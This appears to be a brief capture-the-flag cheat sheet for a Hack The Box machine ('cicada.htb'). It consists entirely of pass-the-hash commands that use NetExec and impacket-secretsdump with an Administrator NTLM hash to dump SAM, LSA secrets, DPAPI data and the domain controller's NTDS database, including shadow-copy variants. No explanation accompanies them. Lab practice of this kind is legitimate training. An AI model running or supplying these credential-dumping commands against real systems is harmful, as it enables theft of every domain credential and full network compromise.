

`nxc smb 10.129.169.79 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341:2b87e7c93a3e8a0ea4a581937016f341 --sam`

`nxc smb 10.129.169.79 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341:2b87e7c93a3e8a0ea4a581937016f341 --lsa`

`nxc smb 10.129.169.79 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341:2b87e7c93a3e8a0ea4a581937016f341 --dpapi`


`impacket-secretsdump 'cicada.htb/Administrator'@10.129.169.79 -hashes :2b87e7c93a3e8a0ea4a581937016f341 -just-dc -use-vss`


### Domain controllers only

`nxc smb 10.129.169.79 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341:2b87e7c93a3e8a0ea4a581937016f341 --ntds`

`nxc smb 10.129.169.79 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341:2b87e7c93a3e8a0ea4a581937016f341 --ntds vss`
